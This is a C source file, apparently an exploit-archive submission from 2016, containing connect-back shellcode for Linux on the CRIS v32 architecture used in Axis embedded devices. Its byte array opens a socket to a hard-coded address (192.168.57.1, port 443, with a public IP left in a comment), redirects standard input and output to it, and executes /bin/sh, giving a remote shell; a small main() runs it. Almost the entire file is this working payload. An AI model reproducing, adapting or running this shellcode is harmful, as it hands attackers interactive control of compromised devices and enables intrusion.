/*
 * Title: Linux/Crisv32 - connect back shellcode
 * Author: mcw / 2016-06
 * 
 * crisv32-axis-linux-gnu-gcc -Wall -finline-functions -fno-common \
 * -fomit-frame-pointer -static -o crisv32-sc crisv32-sc.c
 */

#include <stdio.h>

char sc[] =
        //close(0) 
        "\x7a\x86"        // clear.d r10 
        "\x5f\x9c\x06\x00"  // movu.w 0x6,r9
        "\x3d\xe9"        // break 13
        //close(1)
        "\x41\xa2"        // moveq 1,r10
        "\x5f\x9c\x06\x00"  // movu.w 0x6,r9
        "\x3d\xe9"        // break 13
        //close(2)
        "\x42\xa2"        // moveq 2,r10
        "\x5f\x9c\x06\x00"  // movu.w 0x6,r9
        "\x3d\xe9"        // break 13
        //
        "\x10\xe1"        // addoq 16,sp,acr
        "\x42\x92"        // moveq 2,r9
        "\xdf\x9b"        // move.w r9,[acr]
        "\x10\xe1"        // addoq 16,sp,acr
        "\x02\xf2"        // addq 2,acr
        //PORT
        "\x5f\x9e\x01\xbb" // move.w 0xbb01,r9 // Port 443
        //"\x5f\x9e\x00\x15"  // move.w 0x1500,r9 // Port 21
        "\xdf\x9b"        // move.w r9,[acr]
        "\x10\xe1"        // addoq 16,sp,acr
        "\x6f\x96"        // move.d acr,r9
        "\x04\x92"        // addq 4,r9
        //IP 
        // 93.74.141.146
        // "\x6f\xfe\x5d\x4a\x8d\x92"    // move.d 928d4a5d,acr
        // 192.168.57.1
        "\x6f\xfe\xc0\xa8\x39\x01"   // move.d 139a8c0,acr
        "\xe9\xfb"        // move.d acr,[r9]
        //   
        //socket()
        "\x42\xa2"        // moveq 2,r10
        "\x41\xb2"        // moveq 1,r11
        "\x7c\x86"        // clear.d r12
        "\x6e\x96"        // move.d $sp,$r9
        "\xe9\xaf"        // move.d $r10,[$r9+]
        "\xe9\xbf"        // move.d $r11,[$r9+]
        "\xe9\xcf"        // move.d $r12,[$r9+]
        "\x41\xa2"        // moveq 1,$r10
        "\x6e\xb6"        // move.d $sp,$r11
        "\x5f\x9c\x66\x00"  // movu.w 0x66,$r9
        "\x3d\xe9"        // break 13
        //   
        "\x6a\x96"        // move.d $r10,$r9
        "\x0c\xe1"        // addoq 12,$sp,$acr
        "\xef\x9b"        // move.d $r9,[$acr]
        "\x0c\xe1"        // addoq 12,$sp,$acr
        "\x6e\x96"        // move.d $sp,$r9
        "\x10\x92"        // addq 16,$r9
        "\x6f\xaa"        // move.d [$acr],$r10
        "\x69\xb6"        // move.d $r9,$r11
        "\x50\xc2"        // moveq 16,$r12
        //   
        // connect()
        "\x6e\x96"        // move.d $sp,$r9
        "\xe9\xaf"        // move.d $r10,[$r9+]
        "\xe9\xbf"        // move.d $r11,[$r9+]
        "\xe9\xcf"        // move.d $r12,[$r9+]
        "\x43\xa2"        // moveq 3,$r10
        "\x6e\xb6"        // move.d $sp,$r11
        "\x5f\x9c\x66\x00"  // movu.w 0x66,$r9 
        "\x3d\xe9"        // break 13
        //   
        //dup(1)
        "\x6f\xaa"        // move.d [$acr],$r10
        "\x41\xb2"        // moveq 1,$r11
        "\x5f\x9c\x3f\x00"  // movu.w 0x3f,$r9
        "\x3d\xe9"        // break 13
        //   
        //dup(2)
        "\x6f\xaa"        // move.d [$acr],$r10
        "\x42\xb2"        // moveq 2,$r11
        "\x5f\x9c\x3f\x00"  // movu.w 0x3f,$r9
        "\x3d\xe9"        // break 13
    
        //execve("/bin/sh",NULL,NULL)
        "\x90\xe2"        // subq 16,$sp
        "\x6e\x96"        // move.d $sp,$r9
        "\x6e\xa6"        // move.d $sp,$10
        "\x6f\x0e\x2f\x2f\x62\x69"    // move.d 69622f2f,$r0
        "\xe9\x0b"        // move.d $r0,[$r9]
        "\x04\x92"        // addq 4,$r9
        "\x6f\x0e\x6e\x2f\x73\x68"    // move.d 68732f6e,$r0
        "\xe9\x0b"        // move.d $r0,[$r9]
        "\x04\x92"        // addq 4,$r9
        "\x79\x8a"        // clear.d [$r9]
        "\x04\x92"        // addq 4,$r9
        "\x79\x8a"        // clear.d [$r9]
        "\x04\x92"        // addq 4,$r9
        "\xe9\xab"        // move.d $r10,[$r9]
        "\x04\x92"        // addq 4,$r9
        "\x79\x8a"        // clear.d [$r9]
        "\x10\xe2"        // addq 16,$sp
        "\x6e\xf6"        // move.d $sp,$acr
        "\x6e\x96"        // move.d $sp,$r9
        "\x6e\xb6"        // move.d $sp,$r11
        "\x7c\x86"        // clear.d $r12
        "\x4b\x92"        // moveq 11,$r9
        "\x3d\xe9";        // break 13
         
void 
main(void) 
{
 void (*s)(void);
 printf("sc size %d\n", sizeof(sc));
 s = sc;
 s();
}
                      